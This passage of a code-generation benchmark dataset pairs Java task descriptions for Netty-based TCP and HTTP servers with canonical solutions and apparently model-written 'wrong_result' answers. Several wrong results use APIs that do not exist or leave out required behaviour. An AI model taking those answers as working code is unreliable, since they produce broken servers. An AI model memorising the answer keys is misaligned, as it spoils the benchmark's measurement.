    "wrong_result": "public class NettyTcpServer {\n    private ApplicationContext ctx;\n    private EventLoopGroup serverLoop;\n    private ServerSocketChannel server;\n    private int port = -1;\n\n    public NettyTcpServer(ApplicationContext ctx) {\n        this.ctx = ctx;\n    }\n\n    public void startServer(int port) throws Exception {\n        serverLoop = new NioEventLoopGroup();\n        ServerBootstrap bootstrap = new ServerBootstrap();\n        bootstrap.group(serverLoop)\n                 .channel(NioServerSocketChannel.class)\n                 .childHandler(new ChannelInitializer<SocketChannel>() {\n                     @Override\n                     public void initChannel(SocketChannel ch) throws Exception {\n                         ch.pipeline().addLast(new HttpServerCodec());\n                         ch.pipeline().addLast(new HttpObjectAggregator(65536));\n                         ch.pipeline().addLast(new SimpleChannelInboundHandler<FullHttpRequest>() {\n                             @Override\n                             protected void channelRead0(ChannelHandlerContext ctx, FullHttpRequest request) throws Exception {\n                                 FullHttpResponse response = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, HttpResponseStatus.OK);\n                                 ByteBuf content = Unpooled.copiedBuffer(\"Hello from Netty server\", CharsetUtil.UTF_8);\n                                 response.content().writeBytes(content);\n                                 response.headers().set(HttpHeaderNames.CONTENT_TYPE, \"text/plain\");\n                                 response.headers().set(HttpHeaderNames.CONTENT_LENGTH, content.readableBytes());\n                                 ctx.writeAndFlush(response);\n                             }\n                         });\n                     }\n                 })\n                 .option(ChannelOption.SO_BACKLOG, 1024)\n                 .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n        ChannelFuture future = bootstrap.bind(port).sync();\n        this.port = port;\n        this.server = (ServerSocketChannel) future.channel();\n    }\n\n    public void stopServer() {\n        if (serverLoop != null) {\n            serverLoop.shutdownGracefully();\n        }\n        if (server != null) {\n            server.close();\n        }\n        if (ctx != null) {\n            ctx.close();\n        }\n    }\n\n    public int getPort() {\n        return port;\n    }\n}"
  },
  {
    "Task_id": 192,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle incoming client connections and process protocol messages.\n\nClass Description: ProtocolServer is a Netty-based TCP server implementation that listens on a specified port, handles incoming connections, and processes protocol messages using custom channel handlers. It manages server resources including event loop groups and provides graceful shutdown capabilities.\n\nAttributes:\n- acceptorEventLoopGroup: [EventLoopGroup] - Handles accepting new connections (boss group)\n- networkEventLoopGroup: [EventLoopGroup] - Handles network I/O operations (worker group)\n- eventExecutorGroup: [EventExecutorGroup] - Executes business logic handlers\n- config: [Config] - Server configuration including port number\n- applicationContext: [ApplicationContext] - Spring application context for dependency injection\n\nMethods:\n- ProtocolServer([Config] config, [ApplicationContext] applicationContext) -> [void] - Constructor that initializes event loop groups with specified configurations\n- start() -> [ChannelFuture] - Starts the server, binds to the configured port, and returns a ChannelFuture that can be used to wait for server shutdown",
    "Canonical_solution": "import com.codingapi.txlcn.protocol.config.Config;\nimport com.codingapi.txlcn.protocol.handler.ProtocolChannelHandler;\nimport com.codingapi.txlcn.protocol.handler.ProtocolChannelInitializer;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.util.concurrent.EventExecutorGroup;\nimport org.springframework.context.ApplicationContext;\n\nimport java.util.concurrent.TimeUnit;\n\npublic class ProtocolServer {\n\n    private final EventLoopGroup acceptorEventLoopGroup;\n    private final EventLoopGroup networkEventLoopGroup;\n    private final EventExecutorGroup eventExecutorGroup;\n    private final Config config;\n    private final ApplicationContext applicationContext;\n\n    public ProtocolServer(Config config, ApplicationContext applicationContext) {\n        this.config = config;\n        this.applicationContext = applicationContext;\n        this.acceptorEventLoopGroup = new NioEventLoopGroup(1);\n        this.networkEventLoopGroup = new NioEventLoopGroup(6);\n        this.eventExecutorGroup = new NioEventLoopGroup(10);\n    }\n\n    public ChannelFuture start() throws InterruptedException {\n        int portToBind = config.getPort();\n        ProtocolChannelHandler protocolChannelHandler = new ProtocolChannelHandler(new Protocoler(config), applicationContext, config);\n        ProtocolChannelInitializer protocolChannelInitializer = new ProtocolChannelInitializer(config, protocolChannelHandler, eventExecutorGroup);\n\n        final ServerBootstrap peerBootstrap = new ServerBootstrap();\n        peerBootstrap.group(acceptorEventLoopGroup, networkEventLoopGroup)\n                .channel(NioServerSocketChannel.class)\n                .option(ChannelOption.CONNECT_TIMEOUT_MILLIS, 10000)\n                .option(ChannelOption.SO_KEEPALIVE, true)\n                .option(ChannelOption.SO_BACKLOG, 100)\n                .handler(new LoggingHandler(LogLevel.INFO))\n                .childHandler(protocolChannelInitializer);\n\n        final ChannelFuture bindFuture = peerBootstrap.bind(portToBind).sync();\n        if (bindFuture.isSuccess()) {\n            final Channel serverChannel = bindFuture.channel();\n            return serverChannel.closeFuture();\n        } else {\n            throw new RuntimeException(\"Server could not bind to \" + portToBind, bindFuture.cause());\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class ProtocolServer {\n    private final EventLoopGroup acceptorEventLoopGroup;\n    private final EventLoopGroup networkEventLoopGroup;\n    private final EventExecutorGroup eventExecutorGroup;\n    private final Config config;\n    private final ApplicationContext applicationContext;\n    private Channel channel;\n\n    public ProtocolServer(Config config, ApplicationContext applicationContext) {\n        this.acceptorEventLoopGroup = new NioEventLoopGroup(1);\n        this.networkEventLoopGroup = new NioEventLoopGroup();\n        this.eventExecutorGroup = new DefaultEventExecutorGroup(4);\n        this.config = config;\n        this.applicationContext = applicationContext;\n    }\n\n    public ChannelFuture start() {\n        ServerBootstrap bootstrap = new ServerBootstrap();\n        bootstrap.group(acceptorEventLoopGroup, networkEventLoopGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    public void initChannel(SocketChannel ch) {\n                        ChannelPipeline pipeline = ch.pipeline();\n                        pipeline.addLast(eventExecutorGroup, applicationContext.getBean(\"messageDecoder\"));\n                        pipeline.addLast(eventExecutorGroup, applicationContext.getBean(\"messageEncoder\"));\n                        pipeline.addLast(eventExecutorGroup, applicationContext.getBean(\"messageHandler\"));\n                    }\n                })\n                .option(ChannelOption.SO_BACKLOG, 1024)\n                .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n        ChannelFuture future = bootstrap.bind(config.getPort()).syncUninterruptibly();\n        this.channel = future.channel();\n        return future;\n    }\n\n    public void shutdown() {\n        if (channel != null) {\n            channel.close();\n        }\n        acceptorEventLoopGroup.shutdownGracefully();\n        networkEventLoopGroup.shutdownGracefully();\n        eventExecutorGroup.shutdownGracefully();\n    }\n}"
  },
  {
    "Task_id": 193,
    "Instruction": "Task Description: Implement a Java class that sets up a Netty-based TCP server for handling HTTP requests, with thread pool management for business logic processing and idle connection handling.\n\nClass Description: EmbedServer is a Netty-based HTTP server implementation that handles incoming requests using a thread pool for business logic processing. It manages server lifecycle (start/stop) and includes connection idle state detection.\n\nAttributes:\n- executorBiz: ExecutorBiz - Business logic executor for handling requests\n- thread: Thread - Server thread running the Netty event loop\n\nMethods:\n- start(String address, int port, String appname, String accessToken) -> void - Starts the Netty server on specified port with given configuration\n  - address: String - Server bind address\n  - port: int - Server bind port\n  - appname: String - Application name (unused in current implementation)\n  - accessToken: String - Authentication token for requests\n- stop() -> void - Stops the server and releases resources\n- EmbedHttpServerHandler(ExecutorBiz executorBiz, String accessToken, ThreadPoolExecutor bizThreadPool) -> void - Constructor for the HTTP request handler\n  - executorBiz: ExecutorBiz - Business logic executor\n  - accessToken: String - Authentication token\n  - bizThreadPool: ThreadPoolExecutor - Thread pool for request processing\n- channelRead0(ChannelHandlerContext ctx, FullHttpRequest msg) -> void - Handles incoming HTTP requests\n  - ctx: ChannelHandlerContext - Netty channel context\n  - msg: FullHttpRequest - Incoming HTTP request\n- exceptionCaught(ChannelHandlerContext ctx, Throwable cause) -> void - Handles channel exceptions\n  - ctx: ChannelHandlerContext - Netty channel context\n  - cause: Throwable - Exception that occurred\n- userEventTriggered(ChannelHandlerContext ctx, Object evt) -> void - Handles idle state events\n  - ctx: ChannelHandlerContext - Netty channel context\n  - evt: Object - Triggered event (IdleStateEvent for idle connections)",
    "Canonical_solution": "import com.xxl.job.core.biz.ExecutorBiz;\nimport com.xxl.job.core.biz.impl.ExecutorBizImpl;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.*;\nimport io.netty.handler.timeout.IdleStateEvent;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.util.concurrent.*;\n\npublic class EmbedServer {\n    private static final Logger logger = LoggerFactory.getLogger(EmbedServer.class);\n\n    private ExecutorBiz executorBiz;\n    private Thread thread;\n\n    public void start(final String address, final int port, final String appname, final String accessToken) {\n        executorBiz = new ExecutorBizImpl();\n        thread = new Thread(new Runnable() {\n            @Override\n            public void run() {\n                EventLoopGroup bossGroup = new NioEventLoopGroup();\n                EventLoopGroup workerGroup = new NioEventLoopGroup();\n                ThreadPoolExecutor bizThreadPool = new ThreadPoolExecutor(\n                        0,\n                        200,\n                        60L,\n                        TimeUnit.SECONDS,\n                        new LinkedBlockingQueue<Runnable>(2000),\n                        new ThreadFactory() {\n                            @Override\n                            public Thread newThread(Runnable r) {\n                                return new Thread(r, \"xxl-rpc, EmbedServer bizThreadPool-\" + r.hashCode());\n                            }\n                        },\n                        new RejectedExecutionHandler() {\n                            @Override\n                            public void rejectedExecution(Runnable r, ThreadPoolExecutor executor) {\n                                throw new RuntimeException(\"xxl-job, EmbedServer bizThreadPool is EXHAUSTED!\");\n                            }\n                        });\n\n                try {\n                    ServerBootstrap bootstrap = new ServerBootstrap();\n                    bootstrap.group(bossGroup, workerGroup)\n                            .channel(NioServerSocketChannel.class)\n                            .childHandler(new ChannelInitializer<SocketChannel>() {\n                                @Override\n                                public void initChannel(SocketChannel channel) throws Exception {\n                                    channel.pipeline()\n                                            .addLast(new IdleStateHandler(0, 0, 30 * 3, TimeUnit.SECONDS))\n                                            .addLast(new HttpServerCodec())\n                                            .addLast(new HttpObjectAggregator(5 * 1024 * 1024))\n                                            .addLast(new EmbedHttpServerHandler(executorBiz, accessToken, bizThreadPool));\n                                }\n                            })\n                            .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n                    ChannelFuture future = bootstrap.bind(port).sync();\n                    logger.info(\">>>>>>>>>>> xxl-job remoting server start success, nettype = {}, port = {}\", EmbedServer.class, port);\n\n                    future.channel().closeFuture().sync();\n                } catch (InterruptedException e) {\n                    if (e instanceof InterruptedException) {\n                        logger.info(\">>>>>>>>>>> xxl-job remoting server stop.\");\n                    } else {\n                        logger.error(\">>>>>>>>>>> xxl-job remoting server error.\", e);\n                    }\n                } finally {\n                    try {\n                        workerGroup.shutdownGracefully();\n                        bossGroup.shutdownGracefully();\n                    } catch (Exception e) {\n                        logger.error(e.getMessage(), e);\n                    }\n                }\n            }\n        });\n        thread.setDaemon(true);\n        thread.start();\n    }\n\n    public void stop() throws Exception {\n        if (thread!=null && thread.isAlive()) {\n            thread.interrupt();\n        }\n        logger.info(\">>>>>>>>>>> xxl-job remoting server destroy success.\");\n    }\n\n    public static class EmbedHttpServerHandler extends SimpleChannelInboundHandler<FullHttpRequest> {\n        private static final Logger logger = LoggerFactory.getLogger(EmbedHttpServerHandler.class);\n\n        private ExecutorBiz executorBiz;\n        private String accessToken;\n        private ThreadPoolExecutor bizThreadPool;\n\n        public EmbedHttpServerHandler(ExecutorBiz executorBiz, String accessToken, ThreadPoolExecutor bizThreadPool) {\n            this.executorBiz = executorBiz;\n            this.accessToken = accessToken;\n            this.bizThreadPool = bizThreadPool;\n        }\n\n        @Override\n        protected void channelRead0(final ChannelHandlerContext ctx, FullHttpRequest msg) throws Exception {\n            bizThreadPool.execute(new Runnable() {\n                @Override\n                public void run() {\n                    String responseJson = \"{}\";\n                    FullHttpResponse response = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, HttpResponseStatus.OK, Unpooled.copiedBuffer(responseJson, CharsetUtil.UTF_8));\n                    response.headers().set(HttpHeaderNames.CONTENT_TYPE, \"text/html;charset=UTF-8\");\n                    response.headers().set(HttpHeaderNames.CONTENT_LENGTH, response.content().readableBytes());\n                    ctx.writeAndFlush(response);\n                }\n            });\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            logger.error(\">>>>>>>>>>> xxl-job provider netty_http server caught exception\", cause);\n            ctx.close();\n        }\n\n        @Override\n        public void userEventTriggered(ChannelHandlerContext ctx, Object evt) throws Exception {\n            if (evt instanceof IdleStateEvent) {\n                ctx.channel().close();\n                logger.debug(\">>>>>>>>>>> xxl-job provider netty_http server close an idle channel.\");\n            } else {\n                super.userEventTriggered(ctx, evt);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class EmbedServer {\n    private final ExecutorBiz executorBiz;\n    private final Thread thread;\n\n    public EmbedServer(ExecutorBiz executorBiz, ThreadPoolExecutor bizThreadPool) {\n        this.executorBiz = executorBiz;\n        this.thread = new Thread(() -> {\n            // Netty server setup here\n        });\n    }\n\n    public void start(String address, int port, String appname, String accessToken) {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ch.pipeline().addLast(\n                         new IdleStateHandler(0, 0, 60, TimeUnit.SECONDS),\n                         new HttpServerCodec(),\n                         new HttpObjectAggregator(65536),\n                         new EmbedHttpServerHandler(executorBiz, accessToken, bizThreadPool)\n                     );\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(address, port).sync();\n            f.channel().closeFuture().sync();\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n\n    public void stop() {\n        thread.interrupt();\n    }\n\n    private static class EmbedHttpServerHandler extends ChannelInboundHandlerAdapter {\n        private final ExecutorBiz executorBiz;\n        private final String accessToken;\n        private final ThreadPoolExecutor bizThreadPool;\n\n        public EmbedHttpServerHandler(ExecutorBiz executorBiz, String accessToken, ThreadPoolExecutor bizThreadPool) {\n            this.executorBiz = executorBiz;\n            this.accessToken = accessToken;\n            this.bizThreadPool = bizThreadPool;\n        }\n\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            if (msg instanceof FullHttpRequest) {\n                FullHttpRequest request = (FullHttpRequest) msg;\n                if (request.headers().contains(\"Authorization\", accessToken)) {\n                    bizThreadPool.submit(() -> {\n                        try {\n                            executorBiz.execute(request.content().toString(CharsetUtil.UTF_8));\n                        } catch (Exception e) {\n                            e.printStackTrace();\n                        }\n                    });\n                } else {\n                    ctx.writeAndFlush(new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, HttpResponseStatus.UNAUTHORIZED));\n                }\n            }\n            ctx.fireChannelRead(msg);\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n\n        @Override\n        public void userEventTriggered(ChannelHandlerContext ctx, Object evt) {\n            if (evt instanceof IdleStateEvent) {\n                ctx.close();\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 194,
    "Instruction": "Task Description: Create a Java class that implements an HTTP/2 server using Netty framework, capable of handling incoming TCP connections with configurable port settings and proper resource management.\n\nClass Description: The Http2Server class is a Netty-based TCP server implementation that listens for HTTP/2 connections on a specified port. It manages server lifecycle including startup, shutdown, and resource cleanup, using Netty's event loop groups for efficient I/O handling.\n\nAttributes:\n- DEFAULT_PORT: int - Default port number (8080) used when no port is specified\n- bossGroup: EventLoopGroup - Netty event loop group for accepting incoming connections\n- workerGroup: EventLoopGroup - Netty event loop group for handling I/O operations\n- bootstrap: ServerBootstrap - Netty server bootstrap for configuring server parameters\n\nMethods:\n- Http2Server() -> None - Constructor that initializes the event loop groups and server bootstrap\n- start(int port) -> void - Starts the server on the specified port, configures channel options and handlers, and binds to the port\n- shutdown() -> void - Gracefully shuts down the server and releases all resources",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class Http2Server {\n\n    public static int DEFAULT_PORT = 8080;\n\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private ServerBootstrap bootstrap;\n\n    public Http2Server() {\n        this.bossGroup = new NioEventLoopGroup(1);\n        this.workerGroup = new NioEventLoopGroup();\n        this.bootstrap = new ServerBootstrap();\n    }\n\n    public void start(int port) throws Exception {\n        try {\n            bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new Http2ServerInitializer())\n                .option(ChannelOption.SO_BACKLOG, 128)\n                .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = bootstrap.bind(port).sync();\n            System.out.println(\"HTTP/2\u670d\u52a1\u5668\u5df2\u542f\u52a8\uff0c\u7aef\u53e3\uff1a\" + port);\n            f.channel().closeFuture().sync();\n        } finally {\n            shutdown();\n        }\n    }\n\n    public void shutdown() {\n        workerGroup.shutdownGracefully();\n        bossGroup.shutdownGracefully();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class Http2Server {\n    public static final int DEFAULT_PORT = 8080;\n    private final EventLoopGroup bossGroup;\n    private final EventLoopGroup workerGroup;\n    private final ServerBootstrap bootstrap;\n    private Channel channel;\n\n    public Http2Server() {\n        bossGroup = new NioEventLoopGroup(1);\n        workerGroup = new NioEventLoopGroup();\n        bootstrap = new ServerBootstrap();\n    }\n\n    public void start(int port) {\n        bootstrap.group(bossGroup, workerGroup)\n                 .channel(NioServerSocketChannel.class)\n                 .option(ChannelOption.SO_BACKLOG, 100)\n                 .childOption(ChannelOption.SO_KEEPALIVE, true)\n                 .childHandler(new ChannelInitializer<SocketChannel>() {\n                     @Override\n                     public void initChannel(SocketChannel ch) throws Exception {\n                         ch.pipeline().addLast(new Http2SslContext(SslContextBuilder.forServer(\"cert.pem\", \"key.pem\").build()),\n                                             new Http2ServerCodec(),\n                                             new HttpObjectAggregator(65536));\n                         ch.pipeline().addLast(new SimpleChannelInboundHandler<Http2FrameStream>(){\n                             @Override\n                             protected void channelRead0(ChannelHandlerContext ctx, Http2FrameStream msg) throws Exception {\n                                 System.out.println(\"Received HTTP/2 frame: \" + msg);\n                             }\n                         });\n                     }\n                 });\n\n        try {\n            ChannelFuture future = bootstrap.bind(port).sync();\n            channel = future.channel();\n            System.out.println(\"Server started on port \" + port);\n            future.channel().closeFuture().sync();\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void shutdown() {\n        if (channel != null) {\n            channel.close();\n        }\n        bossGroup.shutdownGracefully();\n        workerGroup.shutdownGracefully();\n    }\n}"
  },
  {
    "Task_id": 195,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle incoming client connections and manage them efficiently.\n\nClass Description: The `NettyServer` class is a TCP server implementation using Netty framework. It listens on a specified host and port, manages client connections, and provides hooks for connection events. The server uses non-blocking I/O and maintains a set of active connections.\n\nAttributes:\n- host: [String] - The host address the server binds to (can be null for any local address)\n- port: [int] - The port number the server listens on\n- connections: [Set<Connection>] - Thread-safe set of active client connections\n- onConnect: [Consumer<Connection>] - Callback function triggered when a new connection is established\n- eventLoopGroup: [EventLoopGroup] - Netty event loop group for handling I/O operations\n- server: [ServerBootstrap] - Netty server bootstrap instance for server configuration\n\nMethods:\n- start(): [void] - Starts the Netty server, binds to the specified host and port, and begins accepting connections\n- channelInitializer(): [ChannelInitializer<SocketChannel>] - Creates and returns a channel initializer for new connections\n- close(): [void] - Shuts down the server gracefully, releasing all resources",
    "Canonical_solution": "import io.dingodb.common.Location;\nimport io.dingodb.common.concurrent.ThreadPoolBuilder;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport lombok.Builder;\nimport lombok.Getter;\nimport lombok.extern.slf4j.Slf4j;\n\nimport java.util.Set;\nimport java.util.concurrent.CopyOnWriteArraySet;\nimport java.util.function.Consumer;\n\nimport static io.dingodb.net.netty.Constant.SERVER;\n\n@Slf4j\n@Getter\n@Builder\npublic class NettyServer {\n\n    public final String host;\n    public final int port;\n    private final Set<Connection> connections = new CopyOnWriteArraySet<>();\n    private final Consumer<Connection> onConnect;\n\n    private EventLoopGroup eventLoopGroup;\n    private ServerBootstrap server;\n\n    public void start() throws Exception {\n        server = new ServerBootstrap();\n        eventLoopGroup = new NioEventLoopGroup(2, new ThreadPoolBuilder().name(\"Netty server \" + port).build());\n        server\n            .channel(NioServerSocketChannel.class)\n            .group(eventLoopGroup)\n            .childOption(ChannelOption.TCP_NODELAY, true)\n            .childHandler(channelInitializer());\n        if (host != null) {\n            server.localAddress(host, port);\n        } else {\n            server.localAddress(port);\n        }\n        try {\n            server.bind().sync().await();\n        } catch (Exception e) {\n            log.error(e.getMessage(), e);\n            System.exit(-1);\n        }\n    }\n\n    private ChannelInitializer<SocketChannel> channelInitializer() {\n        return new ChannelInitializer<SocketChannel>() {\n            @Override\n            protected void initChannel(SocketChannel ch) {\n                Connection connection = new Connection(\n                    SERVER, new Location(ch.remoteAddress().getHostName(), ch.remoteAddress().getPort()), ch\n                );\n                NettyHandlers.initChannelPipelineWithHandshake(ch, connection);\n                connections.add(connection);\n                if (onConnect != null) {\n                    onConnect.accept(connection);\n                }\n                ch.closeFuture().addListener(f -> connections.remove(connection)).addListener(f -> connection.close());\n            }\n        };\n    }\n\n    public void close() {\n        eventLoopGroup.shutdownGracefully();\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class NettyServer {\n    private final String host;\n    private final int port;\n    private final Set<Channel> connections;\n    private final Consumer<Channel> onConnect;\n    private EventLoopGroup eventLoopGroup;\n    private ServerBootstrap server;\n\n    public NettyServer(String host, int port, Consumer<Channel> onConnect) {\n        this.host = host;\n        this.port = port;\n        this.onConnect = onConnect;\n        this.connections = new CopyOnWriteArraySet<>();\n    }\n\n    public void start() {\n        eventLoopGroup = new NioEventLoopGroup();\n        server = new ServerBootstrap()\n            .group(eventLoopGroup)\n            .channel(NioServerSocketChannel.class)\n            .childHandler(channelInitializer())\n            .option(ChannelOption.SO_BACKLOG, 1024)\n            .childOption(ChannelOption.AUTO_READ, true);\n\n        ChannelFuture future = server.bind(host, port).syncUninterruptibly();\n        future.channel().closeFuture().syncUninterruptibly();\n    }\n\n    private ChannelInitializer<SocketChannel> channelInitializer() {\n        return new ChannelInitializer<SocketChannel>() {\n            @Override\n            protected void initChannel(SocketChannel ch) {\n                ch.pipeline().addLast(new ChannelInboundHandlerAdapter() {\n                    @Override\n                    public void channelActive(ChannelHandlerContext ctx) {\n                        Channel connection = ctx.channel();\n                        connections.add(connection);\n                        onConnect.accept(connection);\n                    }\n\n                    @Override\n                    public void channelInactive(ChannelHandlerContext ctx) {\n                        Channel connection = ctx.channel();\n                        connections.remove(connection);\n                    }\n                });\n            }\n        };\n    }\n\n    public void close() {\n        if (server != null) {\n            server.group().shutdownGracefully();\n        }\n        if (eventLoopGroup != null) {\n            eventLoopGroup.shutdownGracefully();\n        }\n    }\n}"
  },
  {
    "Task_id": 196,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using the Netty framework, capable of handling incoming client connections and processing messages.\n\nClass Description: The NettyTcpServer class is a TCP server implementation using Netty's non-blocking I/O. It manages server lifecycle (startup and shutdown) and handles client connections through configurable event loop groups and channel pipelines.\n\nAttributes:\n- serverBootstrap: ServerBootstrap - The main Netty server configuration object\n- bossGroup: EventLoopGroup - Handles incoming connection requests\n- workerGroup: EventLoopGroup - Handles I/O operations for established connections\n- port: int - The port number the server listens on\n\nMethods:\n- NettyTcpServer(int port) -> void - Constructor that initializes the server with specified port\n- start() -> void - Starts the server, binds to the configured port, and begins accepting connections\n- shutdown() -> void - Gracefully shuts down the server and releases resources\n- NettyServerHandler (inner class) - Handles incoming messages and exceptions for client connections\n  - channelRead(ChannelHandlerContext, Object) -> void - Processes incoming messages\n  - exceptionCaught(ChannelHandlerContext, Throwable) -> void - Handles channel exceptions",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport java.net.InetSocketAddress;\n\npublic class NettyTcpServer {\n\n    private final ServerBootstrap serverBootstrap;\n    private final EventLoopGroup bossGroup;\n    private final EventLoopGroup workerGroup;\n    private final int port;\n\n    public NettyTcpServer(int port) {\n        this.port = port;\n        this.bossGroup = new NioEventLoopGroup();\n        this.workerGroup = new NioEventLoopGroup();\n        this.serverBootstrap = new ServerBootstrap();\n    }\n\n    public void start() throws InterruptedException {\n        try {\n            serverBootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .localAddress(new InetSocketAddress(port))\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) {\n                        ch.pipeline().addLast(new NettyServerHandler());\n                    }\n                })\n                .option(ChannelOption.SO_BACKLOG, 128)\n                .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture channelFuture = serverBootstrap.bind().sync();\n            channelFuture.channel().closeFuture().sync();\n        } finally {\n            shutdown();\n        }\n    }\n\n    public void shutdown() {\n        workerGroup.shutdownGracefully();\n        bossGroup.shutdownGracefully();\n    }\n\n    private static class NettyServerHandler extends io.netty.channel.ChannelInboundHandlerAdapter {\n        @Override\n        public void channelRead(io.netty.channel.ChannelHandlerContext ctx, Object msg) {\n            // Message processing logic\n        }\n\n        @Override\n        public void exceptionCaught(io.netty.channel.ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class NettyTcpServer {\n    private final ServerBootstrap serverBootstrap;\n    private final EventLoopGroup bossGroup;\n    private final EventLoopGroup workerGroup;\n    private final int port;\n\n    public NettyTcpServer(int port) {\n        this.port = port;\n        bossGroup = new NioEventLoopGroup(1);\n        workerGroup = new NioEventLoopGroup();\n        serverBootstrap = new ServerBootstrap()\n                .group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) {\n                        ch.pipeline().addLast(new NettyServerHandler());\n                    }\n                })\n                .option(ChannelOption.SO_BACKLOG, 128)\n                .childOption(ChannelOption.SO_KEEPALIVE, true);\n    }\n\n    public void start() {\n        try {\n            ChannelFuture future = serverBootstrap.bind(port).sync();\n            System.out.println(\"Server started on port \" + port);\n            future.channel().closeFuture().sync();\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n            System.err.println(\"Server interrupted: \" + e.getMessage());\n        } finally {\n            shutdown();\n        }\n    }\n\n    public void shutdown() {\n        if (bossGroup != null) bossGroup.shutdownGracefully();\n        if (workerGroup != null) workerGroup.shutdownGracefully();\n    }\n\n    private class NettyServerHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            try {\n                System.out.println(\"Received message: \" + msg);\n                // Process message here\n            } finally {\n                if (msg instanceof ByteBuf) {\n                    ((ByteBuf) msg).release();\n                }\n            }\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 197,
